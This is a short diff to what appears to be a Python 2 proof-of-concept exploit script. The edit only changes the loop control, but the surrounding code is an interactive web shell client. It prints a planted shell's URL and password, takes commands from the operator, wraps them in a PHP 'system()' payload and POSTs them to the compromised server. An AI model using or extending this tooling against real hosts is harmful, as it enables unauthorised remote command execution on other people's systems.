@@ -40,8 +40,7 @@ def poc():
 		print "[*] The shell url: " + shell
 		print "[*] The shell password: " + password
 
-		flag = 1
-		while flag:
+		while 1:
 			try:
 				command = raw_input("[*] input the command:")
 				payload= 'system("%s");' % command
@@ -52,7 +51,7 @@ def poc():
 					r = requests.post(shell, data=postdata)
 					print r.text.encode(r.encoding)
 				else:
-					flag = 0
+					break
 			except EOFError as e:
 				print "[*] type 'exit' to quit"
 				pass
